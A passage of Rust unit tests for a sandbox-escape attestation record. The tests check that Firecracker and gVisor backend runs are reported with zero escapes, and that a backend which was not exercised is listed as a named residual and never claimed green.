                    residual_note: None,
                },
                BackendRun {
                    backend: Backend::GvisorRunsc,
                    exercised: false,
                    residual_note: Some(
                        "runsc requires privileges this host lacks (no sudo)".into(),
                    ),
                },
            ],
            Backend::FirecrackerMicrovm,
            "7a2bc8ed2c64ed78994971439b00c234b1ce46d247123314d683df7579c77923",
            "467367e6b8e88323dd23dedae3119ade9c9fca6a102a84fc2155e3ef1bec00eb",
            "6.1.168",
        )
        .unwrap();
        assert_eq!(att.total_escapes, 0);
        assert_eq!(att.corpus_version, CORPUS_VERSION);
        assert_eq!(att.gate_backend, Backend::FirecrackerMicrovm);
        // Firecracker exercised; gVisor recorded as a NAMED residual (not faked).
        assert!(att
            .backends
            .iter()
            .any(|b| b.backend == Backend::FirecrackerMicrovm && b.exercised));
        assert!(att
            .backends
            .iter()
            .any(|b| b.backend == Backend::GvisorRunsc
                && !b.exercised
                && b.residual_note.is_some()));
        // The named residuals are carried in writing (the no-floor / permanent-gate posture).
        assert!(att.residuals.iter().any(|r| r.contains("PERMANENT GATE")));
        assert!(att.residuals.iter().any(|r| r.contains("CI-P28")));
        assert!(att
            .residuals
            .iter()
            .any(|r| r.contains("CI-P27") || r.contains("P-348")));
        // The green line + JSON serialize.
        assert!(att.green_line().starts_with("[AG-D4 GREEN]"));
        assert!(att.green_line().contains("total-escapes=0"));
        let json = att.to_json();
        let back: EscapeAttestation = serde_json::from_str(&json).unwrap();
        assert_eq!(att, back);
    }

    #[test]
    fn green_line_lists_only_actually_exercised_backends() {
        let report = parse_console(&green_console());
        let att = EscapeAttestation::from_green_drill(
            "2026-06-21",
            &report,
            vec![
                BackendRun {
                    backend: Backend::FirecrackerMicrovm,
                    exercised: true,
                    residual_note: None,
                },
                BackendRun {
                    backend: Backend::GvisorRunsc,
                    exercised: false,
                    residual_note: Some("no sudo".into()),
                },
            ],
            Backend::FirecrackerMicrovm,
            "r",
            "k",
            "6.1.168",
        )
        .unwrap();
        let line = att.green_line();
        assert!(line.contains("firecracker"));
        assert!(
            !line.contains("gvisor"),
            "a non-exercised backend must not be claimed green"
        );
    }
}
